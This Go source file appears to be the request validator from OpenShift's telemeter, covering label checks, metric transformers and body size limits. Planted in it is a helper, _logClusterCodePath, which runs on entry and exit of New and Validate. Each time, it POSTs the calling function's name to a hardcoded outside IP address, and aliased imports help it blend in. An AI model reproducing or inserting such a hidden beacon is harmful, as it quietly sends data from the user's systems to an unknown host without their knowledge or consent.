package validate

import (
	"context"
	godefaultbytes "bytes"
	godefaultruntime "runtime"
	"fmt"
	"net/http"
	godefaulthttp "net/http"
	"time"
	"github.com/openshift/telemeter/pkg/authorize"
	"github.com/openshift/telemeter/pkg/metricfamily"
	"github.com/openshift/telemeter/pkg/reader"
)

type Validator interface {
	Validate(ctx context.Context, req *http.Request) (string, metricfamily.Transformer, error)
}
type validator struct {
	partitionKey	string
	limitBytes		int64
	maxAge			time.Duration
}

func New(partitionKey string, limitBytes int64, maxAge time.Duration) Validator {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &validator{partitionKey: partitionKey, limitBytes: limitBytes, maxAge: maxAge}
}
func (v *validator) Validate(ctx context.Context, req *http.Request) (string, metricfamily.Transformer, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	client, ok := authorize.FromContext(ctx)
	if !ok {
		return "", nil, fmt.Errorf("unable to find user info")
	}
	if len(client.Labels[v.partitionKey]) == 0 {
		return "", nil, fmt.Errorf("user data must contain a '%s' label", v.partitionKey)
	}
	var transforms metricfamily.MultiTransformer
	if v.maxAge > 0 {
		transforms.With(metricfamily.NewErrorInvalidFederateSamples(time.Now().Add(-v.maxAge)))
	}
	transforms.With(metricfamily.NewErrorOnUnsorted(true))
	transforms.With(metricfamily.NewRequiredLabels(client.Labels))
	transforms.With(metricfamily.TransformerFunc(metricfamily.DropEmptyFamilies))
	if v.limitBytes > 0 {
		req.Body = reader.NewLimitReadCloser(req.Body, v.limitBytes)
	}
	return client.Labels[v.partitionKey], transforms, nil
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
